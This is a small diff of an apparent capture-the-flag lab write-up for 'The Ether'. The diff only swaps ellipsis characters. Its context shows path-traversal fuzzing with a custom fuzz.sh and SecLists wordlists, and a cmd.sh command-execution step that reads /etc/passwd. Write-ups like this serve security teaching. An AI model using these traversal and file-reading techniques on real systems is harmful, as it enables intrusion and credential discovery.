@@ -154,7 +154,7 @@ Now, let's give `fuzz.sh` a shot.
 
 ```
 # ./fuzz.sh "../FUZZ/about.php" "About The Ether" /usr/share/seclists/Discovery/Web_Content/common.txt
-…
+...
 [+] Trying ../pub/about.php
 [+] Trying ../public/about.php
 [+] Trying ../public_ftp/about.php
@@ -192,7 +192,7 @@ Using the custom wordlist with `fuzz.sh`, I was able to map out the next level.
 
 ```
 # ./fuzz.sh "../../FUZZ/public_html/about.php" "About The Ether" custom.txt
-…
+...
 [+] Trying ../../theeTHER.CoM/public_html/about.php
 [+] Trying ../../theeTHER.COm/public_html/about.php
 [+] Trying ../../theeTHER.COM/public_html/about.php
@@ -215,7 +215,7 @@ Using `quickhits.txt` from SecLists with `fuzz.sh`, I was able to map out this l
 
 ```
 # ./fuzz.sh "/var/www/html/theEther.comFUZZ" "^[0-9]" /usr/share/seclists/Discovery/Web_Content/quickhits.txt
-…
+...
 [+] Trying /var/www/html/theEther.com/log.sqlite
 [+] Trying /var/www/html/theEther.com/log.txt
 [+] Trying /var/www/html/theEther.com/log/
@@ -290,7 +290,7 @@ Let's give it a shot.
 ```
 # ./cmd.sh -e "cat /etc/passwd"
 root:x:0:0:root:/root:/bin/bash
-…
+...
 usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
 evilscience:x:1000:1000:evilscience,,,:/home/evilscience:/bin/bash
 sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
